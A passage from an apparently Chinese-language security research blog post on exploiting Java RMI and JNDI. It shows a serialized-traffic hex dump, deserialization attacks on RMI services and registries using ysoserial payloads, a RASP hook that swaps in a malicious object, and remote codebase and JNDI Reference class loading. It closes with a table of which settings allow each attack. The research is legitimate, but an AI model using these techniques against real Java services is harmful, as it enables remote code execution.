ngt..jav</span><br><span class="line">    000003F0  61 2e 62 61 73 65 74 00  06 31 31 2e 30 2e 36 73   a.baset. .11.0.6s</span><br><span class="line">    00000400  71 00 7e 00 0b 02 00 00  00 9c 70 71 00 7e 00 0d   q.~..... ..pq.~..</span><br><span class="line">    00000410  71 00 7e 00 0e 74 00 0c  74 6f 53 74 72 69 6e 67   q.~..t.. toString</span><br><span class="line">    00000420  49 6d 70 6c 71 00 7e 00  10 71 00 7e 00 11 73 71   Implq.~. .q.~..sq</span><br><span class="line">    00000430  00 7e 00 0b 02 00 00 00  48 70 71 00 7e 00 0d 71   .~...... Hpq.~..q</span><br><span class="line">    00000440  00 7e 00 0e 74 00 06 69  6e 76 6f 6b 65 71 00 7e   .~..t..i nvokeq.~</span><br><span class="line">    00000450  00 10 71 00 7e 00 11 73  71 00 7e 00 0b 01 ff ff   ..q.~..s q.~.....</span><br><span class="line">    00000460  ff ff 74 00 03 61 70 70  74 00 15 63 6f 6d 2e 73   ..t..app t..com.s</span><br><span class="line">    00000470  75 6e 2e 70 72 6f 78 79  2e 24 50 72 6f 78 79 31   un.proxy .$Proxy1</span><br><span class="line">    00000480  70 74 00 08 74 6f 53 74  72 69 6e 67 70 70 73 71   pt..toSt ringppsq</span><br><span class="line">    00000490  00 7e 00 0b 02 00 00 0b  87 70 74 00 10 6a 61 76   .~...... .pt..jav</span><br><span class="line">    000004A0  61 2e 6c 61 6e 67 2e 53  74 72 69 6e 67 74 00 0b   a.lang.S tringt..</span><br><span class="line">    000004B0  53 74 72 69 6e 67 2e 6a  61 76 61 74 00 07 76 61   String.j avat..va</span><br><span class="line">    000004C0  6c 75 65 4f 66 71 00 7e  00 10 71 00 7e 00 11 73   lueOfq.~ ..q.~..s</span><br><span class="line">    000004D0  71 00 7e 00 0b 01 00 00  00 06 71 00 7e 00 17 74   q.~..... ..q.~..t</span><br><span class="line">    000004E0  00 1a 64 65 6d 6f 2e 72  6d 62 31 32 32 2e 54 65   ..demo.r mb122.Te</span><br><span class="line">    000004F0  73 74 4f 62 6a 65 63 74  49 6d 70 6c 74 00 13 54   stObject Implt..T</span><br><span class="line">    00000500  65 73 74 4f 62 6a 65 63  74 49 6d 70 6c 2e 6a 61   estObjec tImpl.ja</span><br><span class="line">    00000510  76 61 74 00 06 63 61 6c  6c 4d 65 70 70 73 71 00   vat..cal lMeppsq.</span><br><span class="line">    00000520  7e 00 0b 02 ff ff ff fe  70 74 00 2d 6a 64 6b 2e   ~....... pt.-jdk.</span><br><span class="line">    00000530  69 6e 74 65 72 6e 61 6c  2e 72 65 66 6c 65 63 74   internal .reflect</span><br><span class="line">    00000540  2e 4e 61 74 69 76 65 4d  65 74 68 6f 64 41 63 63   .NativeM ethodAcc</span><br><span class="line">    00000550  65 73 73 6f 72 49 6d 70  6c 74 00 1d 4e 61 74 69   essorImp lt..Nati</span><br><span class="line">    00000560  76 65 4d 65 74 68 6f 64  41 63 63 65 73 73 6f 72   veMethod Accessor</span><br><span class="line">    00000570  49 6d 70 6c 2e 6a 61 76  61 74 00 07 69 6e 76 6f   Impl.jav at..invo</span><br><span class="line">    00000580  6b 65 30 71 00 7e 00 10  71 00 7e 00 11 73 71 00   ke0q.~.. q.~..sq.</span><br><span class="line">    00000590  7e 00 0b 02 00 00 00 3e  70 71 00 7e 00 23 71 00   ~......&gt; pq.~.#q.</span><br><span class="line">    000005A0  7e 00 24 71 00 7e 00 15  71 00 7e 00 10 71 00 7e   ~.$q.~.. q.~..q.~</span><br><span class="line">    000005B0  00 11 73 71 00 7e 00 0b  02 00 00 00 2b 70 74 00   ..sq.~.. ....+pt.</span><br><span class="line">    000005C0  31 6a 64 6b 2e 69 6e 74  65 72 6e 61 6c 2e 72 65   1jdk.int ernal.re</span><br><span class="line">    000005D0  66 6c 65 63 74 2e 44 65  6c 65 67 61 74 69 6e 67   flect.De legating</span><br><span class="line">    000005E0  4d 65 74 68 6f 64 41 63  63 65 73 73 6f 72 49 6d   MethodAc cessorIm</span><br><span class="line">    000005F0  70 6c 74 00 21 44 65 6c  65 67 61 74 69 6e 67 4d   plt.!Del egatingM</span><br><span class="line">    00000600  65 74 68 6f 64 41 63 63  65 73 73 6f 72 49 6d 70   ethodAcc essorImp</span><br><span class="line">    00000610  6c 2e 6a 61 76 61 71 00  7e 00 15 71 00 7e 00 10   l.javaq. ~..q.~..</span><br><span class="line">    00000620  71 00 7e 00 11 73 71 00  7e 00 0b 02 00 00 02 36   q.~..sq. ~......6</span><br><span class="line">    00000630  70 74 00 18 6a 61 76 61  2e 6c 61 6e 67 2e 72 65   pt..java .lang.re</span><br><span class="line">    00000640  66 6c 65 63 74 2e 4d 65  74 68 6f 64 74 00 0b 4d   flect.Me thodt..M</span><br><span class="line">    00000650  65 74 68 6f 64 2e 6a 61  76 61 71 00 7e 00 15 71   ethod.ja vaq.~..q</span><br><span class="line">    00000660  00 7e 00 10 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~..q.~. .sq.~...</span><br><span class="line">    00000670  00 00 01 67 70 74 00 1f  73 75 6e 2e 72 6d 69 2e   ...gpt.. sun.rmi.</span><br><span class="line">    00000680  73 65 72 76 65 72 2e 55  6e 69 63 61 73 74 53 65   server.U nicastSe</span><br><span class="line">    00000690  72 76 65 72 52 65 66 74  00 15 55 6e 69 63 61 73   rverReft ..Unicas</span><br><span class="line">    000006A0  74 53 65 72 76 65 72 52  65 66 2e 6a 61 76 61 74   tServerR ef.javat</span><br><span class="line">    000006B0  00 08 64 69 73 70 61 74  63 68 74 00 08 6a 61 76   ..dispat cht..jav</span><br><span class="line">    000006C0  61 2e 72 6d 69 71 00 7e  00 11 73 71 00 7e 00 0b   a.rmiq.~ ..sq.~..</span><br><span class="line">    000006D0  02 00 00 00 c8 70 74 00  1d 73 75 6e 2e 72 6d 69   .....pt. .sun.rmi</span><br><span class="line">    000006E0  2e 74 72 61 6e 73 70 6f  72 74 2e 54 72 61 6e 73   .transpo rt.Trans</span><br><span class="line">    000006F0  70 6f 72 74 24 31 74 00  0e 54 72 61 6e 73 70 6f   port$1t. .Transpo</span><br><span class="line">    00000700  72 74 2e 6a 61 76 61 74  00 03 72 75 6e 71 00 7e   rt.javat ..runq.~</span><br><span class="line">    00000710  00 31 71 00 7e 00 11 73  71 00 7e 00 0b 02 00 00   .1q.~..s q.~.....</span><br><span class="line">    00000720  00 c5 70 71 00 7e 00 33  71 00 7e 00 34 71 00 7e   ..pq.~.3 q.~.4q.~</span><br><span class="line">    00000730  00 35 71 00 7e 00 31 71  00 7e 00 11 73 71 00 7e   .5q.~.1q .~..sq.~</span><br><span class="line">    00000740  00 0b 02 ff ff ff fe 70  74 00 1e 6a 61 76 61 2e   .......p t..java.</span><br><span class="line">    00000750  73 65 63 75 72 69 74 79  2e 41 63 63 65 73 73 43   security .AccessC</span><br><span class="line">    00000760  6f 6e 74 72 6f 6c 6c 65  72 74 00 15 41 63 63 65   ontrolle rt..Acce</span><br><span class="line">    00000770  73 73 43 6f 6e 74 72 6f  6c 6c 65 72 2e 6a 61 76   ssContro ller.jav</span><br><span class="line">    00000780  61 74 00 0c 64 6f 50 72  69 76 69 6c 65 67 65 64   at..doPr ivileged</span><br><span class="line">    00000790  71 00 7e 00 10 71 00 7e  00 11 73 71 00 7e 00 0b   q.~..q.~ ..sq.~..</span><br><span class="line">    000007A0  02 00 00 00 c4 70 74 00  1b 73 75 6e 2e 72 6d 69   .....pt. .sun.rmi</span><br><span class="line">    000007B0  2e 74 72 61 6e 73 70 6f  72 74 2e 54 72 61 6e 73   .transpo rt.Trans</span><br><span class="line">    000007C0  70 6f 72 74 71 00 7e 00  34 74 00 0b 73 65 72 76   portq.~. 4t..serv</span><br><span class="line">    000007D0  69 63 65 43 61 6c 6c 71  00 7e 00 31 71 00 7e 00   iceCallq .~.1q.~.</span><br><span class="line">    000007E0  11 73 71 00 7e 00 0b 02  00 00 02 32 70 74 00 22   .sq.~... ...2pt.&quot;</span><br><span class="line">    000007F0  73 75 6e 2e 72 6d 69 2e  74 72 61 6e 73 70 6f 72   sun.rmi. transpor</span><br><span class="line">    00000800  74 2e 74 63 70 2e 54 43  50 54 72 61 6e 73 70 6f   t.tcp.TC PTranspo</span><br><span class="line">    00000810  72 74 74 00 11 54 43 50  54 72 61 6e 73 70 6f 72   rtt..TCP Transpor</span><br><span class="line">    00000820  74 2e 6a 61 76 61 74 00  0e 68 61 6e 64 6c 65 4d   t.javat. .handleM</span><br><span class="line">    00000830  65 73 73 61 67 65 73 71  00 7e 00 31 71 00 7e 00   essagesq .~.1q.~.</span><br><span class="line">    00000840  11 73 71 00 7e 00 0b 02  00 00 03 1c 70 74 00 34   .sq.~... ....pt.4</span><br><span class="line">    00000850  73 75 6e 2e 72 6d 69 2e  74 72 61 6e 73 70 6f 72   sun.rmi. transpor</span><br><span class="line">    00000860  74 2e 74 63 70 2e 54 43  50 54 72 61 6e 73 70 6f   t.tcp.TC PTranspo</span><br><span class="line">    00000870  72 74 24 43 6f 6e 6e 65  63 74 69 6f 6e 48 61 6e   rt$Conne ctionHan</span><br><span class="line">    00000880  64 6c 65 72 71 00 7e 00  40 74 00 04 72 75 6e 30   dlerq.~. @t..run0</span><br><span class="line">    00000890  71 00 7e 00 31 71 00 7e  00 11 73 71 00 7e 00 0b   q.~.1q.~ ..sq.~..</span><br><span class="line">    000008A0  02 00 00 02 a5 70 71 00  7e 00 43 71 00 7e 00 40   .....pq. ~.Cq.~.@</span><br><span class="line">    000008B0  74 00 0c 6c 61 6d 62 64  61 24 72 75 6e 24 30 71   t..lambd a$run$0q</span><br><span class="line">    000008C0  00 7e 00 31 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~.1q.~. .sq.~...</span><br><span class="line">    000008D0  ff ff ff fe 70 71 00 7e  00 38 71 00 7e 00 39 71   ....pq.~ .8q.~.9q</span><br><span class="line">    000008E0  00 7e 00 3a 71 00 7e 00  10 71 00 7e 00 11 73 71   .~.:q.~. .q.~..sq</span><br><span class="line">    000008F0  00 7e 00 0b 02 00 00 02  a4 70 71 00 7e 00 43 71   .~...... .pq.~.Cq</span><br><span class="line">    00000900  00 7e 00 40 71 00 7e 00  35 71 00 7e 00 31 71 00   .~.@q.~. 5q.~.1q.</span><br><span class="line">    00000910  7e 00 11 73 71 00 7e 00  0b 02 00 00 04 68 70 74   ~..sq.~. .....hpt</span><br><span class="line">    00000920  00 27 6a 61 76 61 2e 75  74 69 6c 2e 63 6f 6e 63   .&#39;java.u til.conc</span><br><span class="line">    00000930  75 72 72 65 6e 74 2e 54  68 72 65 61 64 50 6f 6f   urrent.T hreadPoo</span><br><span class="line">    00000940  6c 45 78 65 63 75 74 6f  72 74 00 17 54 68 72 65   lExecuto rt..Thre</span><br><span class="line">    00000950  61 64 50 6f 6f 6c 45 78  65 63 75 74 6f 72 2e 6a   adPoolEx ecutor.j</span><br><span class="line">    00000960  61 76 61 74 00 09 72 75  6e 57 6f 72 6b 65 72 71   avat..ru nWorkerq</span><br><span class="line">    00000970  00 7e 00 10 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~..q.~. .sq.~...</span><br><span class="line">    00000980  00 00 02 74 70 74 00 2e  6a 61 76 61 2e 75 74 69   ...tpt.. java.uti</span><br><span class="line">    00000990  6c 2e 63 6f 6e 63 75 72  72 65 6e 74 2e 54 68 72   l.concur rent.Thr</span><br><span class="line">    000009A0  65 61 64 50 6f 6f 6c 45  78 65 63 75 74 6f 72 24   eadPoolE xecutor$</span><br><span class="line">    000009B0  57 6f 72 6b 65 72 71 00  7e 00 4b 71 00 7e 00 35   Workerq. ~.Kq.~.5</span><br><span class="line">    000009C0  71 00 7e 00 10 71 00 7e  00 11 73 71 00 7e 00 0b   q.~..q.~ ..sq.~..</span><br><span class="line">    000009D0  02 00 00 03 42 70 74 00  10 6a 61 76 61 2e 6c 61   ....Bpt. .java.la</span><br><span class="line">    000009E0  6e 67 2e 54 68 72 65 61  64 74 00 0b 54 68 72 65   ng.Threa dt..Thre</span><br><span class="line">    000009F0  61 64 2e 6a 61 76 61 71  00 7e 00 35 71 00 7e 00   ad.javaq .~.5q.~.</span><br><span class="line">    00000A00  10 71 00 7e 00 11 73 72  00 1f 6a 61 76 61 2e 75   .q.~..sr ..java.u</span><br><span class="line">    00000A10  74 69 6c 2e 43 6f 6c 6c  65 63 74 69 6f 6e 73 24   til.Coll ections$</span><br><span class="line">    00000A20  45 6d 70 74 79 4c 69 73  74 7a b8 17 b4 3c a7 9e   EmptyLis tz...&lt;..</span><br><span class="line">    00000A30  de 02 00 00 70 78 70 78                            ....pxpx</span><br></pre></td></tr></table></figure><p>看到一堆 <code>ac ed 00 05</code>, 就可以证明漏洞的来源了, 原因就是 RMI 协议是基于 java 自带的序列化的. 如果参数类型是 Object, 直接传 payload 就行了. 如果不是 Object 但是是类型是接口, 我们可以通过 Proxy 给 ysoseiral 的 payload 套一层, 也能直接打服务端. 不过比较麻烦的是 java 的动态代理只能代理 Interface, 所以如果形参类型是 String, HashMap 等就没办法了. 另外可以看到异常 <code>java.lang.NullPointerException</code> 是服务提供者发给客户端的, 好像有通过这种方式回显消息的打法, 也是很骚的.  </p><p>另外实际以前上在 bind 给 <code>Registry</code> 等等地方都是可以打的 (ysoseiral 也有对应的 payload), 因为也都是通过反序列化传数据, 不过在一次更新中 java 官方加了限制 (可以看参考文文章 [7]). 在这种地方只能反序列化在白名单里面的类, 不过仍然找到了通过 JRMPClient 的方法来打. 可惜的是最新版本我测试的情况是 JRMPClient 也给修复了, 可以收到 Registry 发的 JRMP 请求, 但是不能成功反序列化, 甚至连异常都没有, 估计仍然是白名单过滤掉了. 所以这方面目前只能通过我上面的说的参数方式来反序列化打服务提供者了.  </p><p>大概是打客户端:<br>直接改 ysoseiral.exploit.JRMPListener.java, 返回恶意 gadgets 即可, 这在 JNDI lookup 都时候也可以用.  </p><p>打注册局:<br>用 ysoseiral.exploit.RMIRegistryExploit.java + 略微修改过的 ysoseiral.exploit.JRMPClient.java.  </p><p>打服务提供者:<br>把参数用恶意对象替换就可以了, 对参数类型有限制.  </p><p>Update:<br>看到了国外的研究, <a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a>  </p><p>可以通过 hook 类方法来直接更改传过去的参数, 绕过部分的限制.  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title">unmarshalValue</span><span class="params">(Class&lt;?&gt; var0, ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0 == Integer.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readInt();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Boolean.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readBoolean();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Byte.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readByte();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Character.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readChar();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Short.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readShort();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Long.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readLong();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Float.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readFloat();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Double.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readDouble();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Unrecognized primitive type: "</span> + var0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> var0 == String.class &amp;&amp; var1 <span class="keyword">instanceof</span> ObjectInputStream ? SharedSecrets.getJavaObjectInputStreamReadString().readString((ObjectInputStream)var1) : var1.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要不是 Interger, String 等直接用对应方法读出的原始类, 就算不是接口类也能通过运行时强行改参数去打, 刚好可以结合之前写的 rasp 完成.  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmb122.easyrasp.hooks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rmb122.easyrasp.annotation.HookHandler;</span><br><span class="line"><span class="keyword">import</span> com.rmb122.easyrasp.enums.HookType;</span><br><span class="line"><span class="keyword">import</span> demo.rmb122.DeserializeObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestHook</span> </span>&#123;</span><br><span class="line">    <span class="meta">@HookHandler</span>(hookClass = <span class="string">"java.rmi.server.RemoteObjectInvocationHandler"</span>, hookMethod = <span class="string">"invokeRemoteMethod"</span>, hookType = HookType.BEFORE_RUN)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object[] test(Object self, Object[] args) &#123;</span><br><span class="line">        System.out.println(<span class="string">"test"</span>);</span><br><span class="line">        System.out.println(Arrays.toString((Object[]) args[<span class="number">2</span>]));</span><br><span class="line">        ((Object[]) args[<span class="number">2</span>])[<span class="number">0</span>] = (Object) <span class="keyword">new</span> DeserializeObject();</span><br><span class="line">        <span class="keyword">return</span> args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然弹出异常说类型错误, 但可以成功触发反序列化.  </p><h2 id="加载远程类"><a href="#加载远程类" class="headerlink" title="加载远程类"></a>加载远程类</h2><p>RMIServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"java.rmi.server.codebase"</span>, <span class="string">"http://127.0.0.1:19132/"</span>);</span><br><span class="line"></span><br><span class="line">        Registry reg = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">"java RMI registry created. port on 9999..."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIClient.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RMISecurityManager;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"java.security.policy"</span>, RMIClient.class.getClassLoader().getResource(<span class="string">"java.policy"</span>).getFile());</span><br><span class="line">        RMISecurityManager securityManager = <span class="keyword">new</span> RMISecurityManager();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line">        System.setProperty(<span class="string">"java.rmi.server.useCodebaseOnly"</span>, <span class="string">"false"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        DeserializeObject deserializeObject = <span class="keyword">new</span> DeserializeObject();</span><br><span class="line">        registry.lookup(<span class="string">"test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Server 设置一个 <code>java.rmi.server.codebase</code>, 这样客户端在 lookup 时发现用到了一个本地不存在的类, 会去从这个 codebase 上加载.<br>在新版里面已经被修复, 利用起来可以用 <code>marshalsec</code>, 更方便.  </p><h1 id="JDNI"><a href="#JDNI" class="headerlink" title="JDNI"></a>JDNI</h1><h2 id="与-RMI-的关系"><a href="#与-RMI-的关系" class="headerlink" title="与 RMI 的关系"></a>与 RMI 的关系</h2><p>JNDI 全名 <code>Java Naming and Directory Interface</code>, 可以看到其实就是将多种协议, 例如远程方法调用 (RMI), 公共对象请求代理体系结构 (CORBA), 轻型目录访问协议 (LDAP) 或域名服务 (DNS). 全部封装到一个接口中, 方便使用.  </p><p>所以以下代码:  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        TestObject object = (TestObject) context.lookup(<span class="string">"rmi://localhost:9999/test"</span>);</span><br><span class="line">        object.callMe(<span class="keyword">new</span> DummyImpl());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与 RMIClient 是完全一样的.<br>不同的是 JNDI 在这基础上加了不少功能, </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">10000</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"test"</span>,<span class="string">"com.rmb122"</span>, <span class="string">"http://127.0.0.1:19133/"</span>);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.rebind(<span class="string">"wrapper"</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如这个 Reference, 客户端查询 wrapper 时, 因为是 <code>Reference</code> 且 com.rmb122 这个工厂类不存在, 将会去 codebase <code>http://127.0.0.1:19133/</code> 上加载, 利用方式与 rmi 远程对象加载是一样的.<br>在新版中已经修复, 需要手动打开 <code>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</code>. 而且在我亲测的时候, 就算打开也没用了, 返回的是 <code>Reference</code> 对象 233. Debug 了一下发现还需要打开 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>, 这才会真正去用 http 协议加载类. 同时因为这是 JNDI 加的内容, 对 RMIClient 是无效的. 会直接返回 Reference 对象.  </p><h2 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI + LDAP"></a>JNDI + LDAP</h2><p>这其实与 RMI 差不多, 就是换了壳, 不同的地方是 ldap 是有索引等概念的, 可以搜索啊之类的, 且返回的对象也比较复杂, 本身就额外套了一层, 有一些特殊的属性. 具体可以看看底下的参考资料.<br>其中值得一说的是有个属性可以附带反序列化对象, 可以用于高版本 jre 下的 fastjson 打本地反序列化 gadget.  </p><h2 id="本地-Class-作为-Reference-Factory"><a href="#本地-Class-作为-Reference-Factory" class="headerlink" title="本地 Class 作为 Reference Factory"></a>本地 Class 作为 Reference Factory</h2><p>上面的是 Reference 是 <code>Reference(&quot;MyClass&quot;,&quot;com.rmb122&quot;, &quot;http://127.0.0.1:19133/&quot;);</code>, 第二个其实就是工厂类, 这里可以利用 <code>org.apache.naming.factory.BeanFactory</code> 这个工厂类来配合, 绕过远程加载的限制. 详细可以看看参考资料 [3].  </p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>大概如下:<br>RMI remote codebase:<br>需要 <code>java.rmi.server.useCodebaseOnly=true</code> 且需要设置 SecurityManager, 比较不实用  </p><p>RMI 打 Service Provider:<br>如果已知一个接口声明, 大部分情况下可以打.  </p><p>RMI 打 Registry:<br>老版本直接用 ysoserial 的 payload 打, 新版本可以尝试用 JRMP Client 的 payload 改一改尝试绕过.  </p><p>JNDI + RMI lookup Reference:<br><code>com.sun.jndi.rmi.object.trustURLCodebase=false</code> 直接爆出异常<br><code>com.sun.jndi.ldap.object.trustURLCodebase=false</code> 返回 Reference 对象<br>如果要利用需要两个选项都 =true  </p><p>JNDI + LDAP lookup Reference:<br><code>com.sun.jndi.rmi.object.trustURLCodebase=false</code> 无影响<br><code>com.sun.jndi.ldap.object.trustURLCodebase=false</code> 返回 Reference 对象<br>只需要 com.sun.jndi.ldap.object.trustURLCodebase=true 即可利用  </p><p>JNDI + LDAP 打本地反序列化, 或者 RMI 反序列化:<br>目前无限制  </p><p>JNDI + LDAP 打本地 Reference Factory:<br>目前无限制  </p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">https://paper.seebug.org/1091/</a><br>[2] <a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" 